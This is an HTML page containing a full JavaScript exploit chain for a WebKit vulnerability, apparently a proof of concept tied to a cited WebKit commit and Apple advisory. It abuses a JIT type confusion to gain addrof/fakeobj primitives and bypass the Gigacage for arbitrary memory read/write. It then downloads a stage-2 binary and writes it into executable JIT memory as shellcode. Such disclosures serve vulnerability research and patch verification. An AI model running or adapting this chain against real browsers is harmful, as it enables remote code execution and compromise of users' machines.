<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
                font-family: Courier, monospace;
                font-size: 4rem;
            }
        </style>
    </head>
<body>
<script src="util.js"></script>
<script src="int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < 87; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        var unboxed_size = 100;
        var convert = new ArrayBuffer(0x10);
        var u32 = new Uint32Array(convert);
        var u8 = new Uint8Array(convert);
        var f64 = new Float64Array(convert);
        var BASE32 = 0x100000000;

        function i2f(i) {
            u32[0] = i%BASE32;
            u32[1] = i/BASE32;
            return f64[0];
        }
        
        function f2i(f) {
            f64[0] = f;
            return u32[0] + BASE32*u32[1];
        }

        function hex(x) {
            if (x < 0)
                return `-${hex(-x)}`
            return `0x${x.toString(16)}`
        }

        function fail(x) {
            log('FAIL ' + x)
            throw null
        }

        var putcharBuffer = "";
        putchar = function (str) {
            if (str[0] == "\n") {
                log(putcharBuffer);
                putcharBuffer = "";
            } else {
                putcharBuffer += str;
            }
        }
        log("stage 2");
        var structure_spray = []
        for (var i = 0; i < 1000; ++i) {
            var ary = [13.37];
            ary.prop = 13.37;
            ary['p'+i] = 13.37;
            structure_spray.push(ary);
        }

        var victim = structure_spray[510]
        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
        // to victim
        u32[0] = 0x200;
        u32[1] = 0x01082007 - 0x10000;
        var flags_double = f64[0];

        u32[1] = 0x01082009 - 0x10000;
        var flags_contiguous = f64[0];

        var array_spray = [];
        for (var i = 0; i < 1000; ++i) {
            array_spray[i] = [13.37+i, 13.37];
        }
        var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
        unboxed[0] = 4.2; // no CopyOnWrite

        var boxed = [{}];
        // log(`unboxed @ ${addrof(unboxed)}`);
        // log(`boxed @ ${addrof(boxed)}`);

        var outer = {
            header: flags_contiguous, // cell
            butterfly: victim, // butterfly
        };

        // log(`outer @ ${addrof(outer)}`);

        var hax = fakeobj(Add(addrof(outer), 16));

        hax[1] = unboxed;
        // log(victim[1]);
        var shared_butterfly = f2i(victim[1]);
        log(`shared butterfly @ ${hex(shared_butterfly)}`);
        hax[1] = boxed;
        victim[1] = i2f(shared_butterfly);

        outer.header = flags_double;

        var stage2 = {
            addrof: function(victim) {
                boxed[0] = victim;
                return f2i(unboxed[0]);
            },

            fakeobj: function(addr) {
                unboxed[0] = i2f(addr);
                return boxed[0];
            },

            write64: function(where, what) {
                log(`writing ${hex(what)} at ${hex(where)}`);
                hax[1] = i2f(where + 0x10);
                victim.prop = this.fakeobj(what);
            },

            read64: function(where) {
                log(`reading at ${hex(where)}`);
                hax[1] = i2f(where + 0x10);
                log("read: " + hex(this.addrof(victim.prop)));
                return this.addrof(victim.prop);
            },

            test: function() {
                var addr = this.addrof({a: 0x1337});
                var x = this.fakeobj(addr);
                if (x.a != 0x1337) {
                    fail('stage2 addrof/fakeobj does not work');
                }

                var val = 0xC0035FD6;
                this.write64(shared_butterfly + 8, 0xC0035FD6);
                if (i2f(val) != unboxed[1]) {
                    fail('stage2 write does not work');
                }

                if (this.read64(shared_butterfly + 8) != 0xC0035FD6) {
                    fail('stage2 read does not work');
                }
            },

            clear: function() {
                outer = null;
                hax = null;
                for (var i = 0; i < unboxed_size; ++i)
                    boxed[i] = null;
                boxed = null
                unboxed = null
            },
        };

        stage2.test();
        log("stage 2 success. got arbitrary read/write");
        return stage2;
    }

    function lol2() {
        function stripPACifRequired(addr) { // ignore macOS sorry
            return And(addr, new Int64('0xFFFFFFFF8'));
        }
        
        function makeJITCompiledFunction() {
            // Some code to avoid inlining...
            function target(num) {
                for (var i = 2; i < num; i++) {
                    if (num % i === 0) {
                        return false;
                    }
                }
                return true;
            }
        
            // Force JIT compilation.
            for (var i = 0; i < 1000; i++) {
                target(i);
            }
            for (var i = 0; i < 1000; i++) {
                target(i);
            }
            for (var i = 0; i < 1000; i++) {
                target(i);
            }
            return target;
        }
        
        function getJITFunction(rwx, silent) {
            if (silent == undefined) {
                silent = false;
            }
            
            if (silent) {
                log = function (str) {};
            }
            
            var shellcodeFunc = makeJITCompiledFunction();
            
            var shellcodeFuncAddr = addrof(shellcodeFunc);
            log("[+] Shellcode function @ " + shellcodeFuncAddr);
            
            var executableAddr = stage2.read64(shellcodeFuncAddr, 3);
            log("[+] Executable instance @ " + executableAddr);
            
            var jitCodeAddr = stage2.read64(executableAddr, 3);
            log("[+] JITCode instance @ " + jitCodeAddr);
            
            var rwxMemAddr = stage2.read64(jitCodeAddr, 4);
            rwxMemAddr = stripPACifRequired(rwxMemAddr);
            log("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
            
            return [shellcodeFunc, rwxMemAddr];
        }
        function fetchAndExec(file, rwx, func) {
            log("[*] Downloading stage 2...");
            fetch(file).then(function (response) {
                if (!response.ok) {
                    log("[!] Failed to download stage 2!");
                    throw "Failed to download stage 2!";
                }
                return response.arrayBuffer();
            }).then(function (buffer) {
                log("[+] Downloaded");
                var funcAddr = getJITFunction(rwx);
                func(new Uint8Array(buffer), funcAddr[0], funcAddr[1]);
                log("[!] Launching stage 2");
            
                // We want to log stuff. Therefore, the shellcode patches itself and then regulary returns to log characters. Yes, this is a creative hack.
                var result = 0;
                while (true) {
                    var value = funcAddr[0]();
                    if (value < 1) {
                        result = value;
                        break;
                    }
                    
                    putchar(String.fromCharCode(value));
                }
                
                log("[+] Stage 2 result: " + result.toString());
                log("[+] I'm done here, continuing WebContent like nothing happened ;)");
            }).catch(function (e) {
                alert("[-] Exception caught: " + e);
            });
        }
        fetchAndExec("./stage2_macOS.bin", true, function (buffer, shellcodeFunc, rwxMemAddr) {
            log("[+] Copying shellcode to memory...");
            // stage2.copyto(rwxMemAddr, 0, buffer, buffer.byteLength);
            stage2.write64(rwxMemAddr, buffer);
        });
    }
        log(`stage 1 success. got fakeobj and addrof primitives`);

        // testobject = {};
        // testobject.a = 1;
        // testobject.b = 2;
        // testobject.c = 3;
        // log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        // Object.values(testobject).forEach((prop)=> log(prop));
        // testobjectfake = fakeobj(addrof(testobject));
        // testobjectfake.b = "we out here";
        // testobjectfake.c = 1337;
        // log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        // Object.values(testobject).forEach((prop)=> log(prop));
        lol();
        lol2();
        stage2.clear();
        stage2 = null;
        trigger = null;
        boxed_arr = null;
        unboxed_arr = null;
        getter = null;
        gc();
})();
</script>

</body>
</html>